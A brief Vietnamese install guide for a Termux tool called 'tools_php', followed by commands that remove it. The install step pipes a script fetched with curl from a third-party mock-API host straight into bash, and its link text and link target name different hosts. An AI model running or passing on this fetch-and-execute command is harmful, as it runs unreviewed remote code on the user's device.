🚀 Hướng dẫn Dưới Đây:

Link Tool: curl -s [https://5g142.wiremockapi.cloud/shtool/install_tools_php](https://raw.githubusercontent.com/AnorinTool/tools_php/refs/heads/main/install.sh) | tr -d '\r' | bash

Xóa Tool Dưới Đây: 
rm -f $PREFIX/bin/tools_php
rm -f ~/bin/tools_php
hash -r
